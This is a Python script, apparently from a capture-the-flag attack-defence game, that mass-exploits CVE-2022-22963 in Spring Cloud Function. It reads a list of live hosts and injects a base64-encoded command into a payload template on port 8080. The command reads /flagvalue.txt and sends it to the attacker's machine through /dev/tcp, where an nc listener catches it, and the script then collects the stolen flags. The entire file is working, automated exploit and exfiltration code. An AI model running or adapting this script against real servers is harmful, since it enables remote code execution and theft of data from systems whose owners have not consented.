import socket
import os
import random
import base64
import time

f=open("alive.txt",'r').readlines()
lhost = "10.11.126.86"


payload_bak = open("payload_cve-2022-22963", 'r').read()
for i in f:
    rhost = i.strip("\r\n")
    rport = 8080
    lport = random.randint(1000, 65535)
    command = "cat /flagvalue.txt > /dev/tcp/%s/%s"%(lhost,lport)   
    command_base64 = base64.b64encode(command.encode())
    payload = payload_bak.replace("PAYLOAD",command_base64.decode())

    s=socket.socket()
    s.settimeout(0.5)
    
    try:
        s.connect((rhost, rport))
    except:
        continue
    print("\033[34m[*]Start exploit %s\033[0m"%rhost)
    os.popen("nc -lvp %s > flag/%s &"%(lport, rhost))
    time.sleep(0.5)
    s.send(payload.encode())



time.sleep(5)
f=open("flag_contect.txt","a")
for p in os.listdir("flag/"):
    if(os.path.getsize("flag/"+p) != 0):
        data = p+":"+open("flag/"+p,"r").read()
        print("\033[32m[+]%s exploit completely\033[0m" % p)
        f.write(data)
f.close()
